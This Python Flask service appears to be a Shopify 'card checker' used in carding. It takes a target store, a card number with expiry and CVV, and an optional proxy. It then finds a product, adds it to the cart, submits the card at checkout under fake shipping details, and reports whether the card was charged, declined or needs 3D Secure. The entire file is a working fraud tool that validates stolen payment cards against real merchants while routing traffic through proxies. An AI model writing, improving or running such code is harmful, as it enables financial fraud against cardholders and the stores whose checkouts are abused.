from flask import Flask, request, jsonify
import requests
import re
import json
import logging
import os
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ---------- HELPERS ----------
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, month, year, cvv = match.groups()
        if len(year) == 2:
            year = '20' + year
        return card, month, year, cvv
    return None, None, None, None

def get_product(site, session, proxy_dict):
    """Try multiple ways to get a product ID"""
    # Method 1: Get first product from products.json
    try:
        url = f"{site}/products.json?limit=1"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('products'):
                return data['products'][0]['id']
    except:
        pass

    # Method 2: Try to get a random product from collections
    try:
        url = f"{site}/collections/all/products.json?limit=1"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('products'):
                return data['products'][0]['id']
    except:
        pass

    # Method 3: Try the cart (sometimes it returns items)
    try:
        url = f"{site}/cart.js"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('items'):
                return data['items'][0]['id']
    except:
        pass

    # Method 4: Common Shopify product IDs (many stores use 1, 2, or 3)
    for pid in [1, 2, 3, 4, 5, 10, 100]:
        try:
            url = f"{site}/products/{pid}.json"
            resp = session.get(url, proxies=proxy_dict, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('product'):
                    return data['product']['id']
        except:
            pass

    return None

def add_to_cart(site, session, product_id, proxy_dict):
    try:
        url = f"{site}/cart/add.js"
        payload = {'id': product_id, 'quantity': 1}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=20)
        return resp.status_code == 200
    except:
        return False

def get_cart_token(site, session, proxy_dict):
    try:
        url = f"{site}/cart.js"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return data.get('token')
    except:
        pass
    return None

def process_payment(site, session, card, month, year, cvv, proxy_dict):
    """Submit payment – simplified but realistic"""
    # Get checkout page to extract authenticity token
    checkout_url = f"{site}/checkout"
    try:
        resp = session.get(checkout_url, proxies=proxy_dict, timeout=20)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Checkout page failed (HTTP {resp.status_code})", "price": 0}
        html = resp.text
        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
        token = token_match.group(1) if token_match else None
    except Exception as e:
        return {"status": "error", "message": f"Failed to load checkout: {str(e)}", "price": 0}

    # Build payment payload
    payload = {
        'authenticity_token': token or '',
        'checkout[credit_card][number]': card,
        'checkout[credit_card][month]': month,
        'checkout[credit_card][year]': year,
        'checkout[credit_card][verification_value]': cvv,
        'checkout[payment_gateway]': 'shopify_payments',
        'checkout[accepts_terms]': '1',
        'checkout[shipping_address][first_name]': 'John',
        'checkout[shipping_address][last_name]': 'Doe',
        'checkout[shipping_address][address1]': '123 Main St',
        'checkout[shipping_address][city]': 'New York',
        'checkout[shipping_address][province]': 'NY',
        'checkout[shipping_address][zip]': '10001',
        'checkout[shipping_address][country]': 'US',
        'checkout[shipping_address][phone]': '1234567890',
        'checkout[email]': 'test@example.com',
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': f"{site}/checkout"
    }

    try:
        # Send to payment endpoint
        payment_url = f"{site}/checkout/payment"
        if token:
            payment_url = f"{site}/checkout/{token}/payment"

        resp = session.post(payment_url, data=payload, headers=headers, proxies=proxy_dict, timeout=30)

        if resp.status_code == 200:
            html = resp.text.lower()
            if 'order placed' in html or 'thank you' in html:
                price_match = re.search(r'total_price["\']?\s*[:=]\s*["\']?([\d.]+)', resp.text)
                price = float(price_match.group(1)) if price_match else 0.0
                return {"status": "charged", "message": "Order placed successfully", "price": price}
            elif '3ds' in html or '3d secure' in html:
                return {"status": "3ds", "message": "3DS_REQUIRED", "price": 0}
            else:
                # Try to extract a clear error message
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.DOTALL)
                if error_match:
                    return {"status": "declined", "message": error_match.group(1).strip(), "price": 0}
                return {"status": "declined", "message": "CARD_DECLINED", "price": 0}
        else:
            return {"status": "error", "message": f"Payment HTTP {resp.status_code}", "price": 0}
    except Exception as e:
        return {"status": "error", "message": str(e), "price": 0}

def checkout_shopify(site, card, month, year, cvv, proxy=None):
    """Main checkout flow"""
    session = requests.Session()
    proxy_dict = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, password = parts
            proxy_dict = {'http': f'http://{user}:{password}@{ip}:{port}', 'https': f'https://{user}:{password}@{ip}:{port}'}
        elif len(parts) == 2:
            ip, port = parts
            proxy_dict = {'http': f'http://{ip}:{port}', 'https': f'https://{ip}:{port}'}

    # 1. Get a product
    product_id = get_product(site, session, proxy_dict)
    if not product_id:
        app.logger.error(f"No product found for {site}")
        return {"Response": "No product found on this store", "Price": 0, "Gateway": "Shopify Payments"}

    app.logger.info(f"Found product: {product_id}")

    # 2. Add to cart
    if not add_to_cart(site, session, product_id, proxy_dict):
        app.logger.error(f"Failed to add product {product_id} to cart")
        return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}

    # 3. Process payment
    result = process_payment(site, session, card, month, year, cvv, proxy_dict)

    if result['status'] == 'charged':
        return {"Response": result['message'], "Price": result['price'], "Gateway": "Shopify Payments"}
    elif result['status'] == '3ds':
        return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify Payments"}
    elif result['status'] == 'declined':
        return {"Response": result['message'], "Price": 0, "Gateway": "Shopify Payments"}
    else:
        return {"Response": f"ERROR: {result['message']}", "Price": 0, "Gateway": "Shopify Payments"}

# ---------- API ENDPOINT ----------
@app.route('/shopify', methods=['GET'])
def shopify_check():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not site or not cc:
        return jsonify({"Response": "Missing site or cc", "Price": 0, "Gateway": "Shopify Payments"}), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"Response": "Invalid card format", "Price": 0, "Gateway": "Shopify Payments"}), 400

    if not site.startswith('http'):
        site = 'https://' + site

    try:
        result = checkout_shopify(site, card, month, year, cvv, proxy)
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Unhandled exception: {e}")
        return jsonify({"Response": f"ERROR: {str(e)}", "Price": 0, "Gateway": "Shopify Payments"}), 500

# ---------- HEALTH ----------
@app.route('/ping')
def ping():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
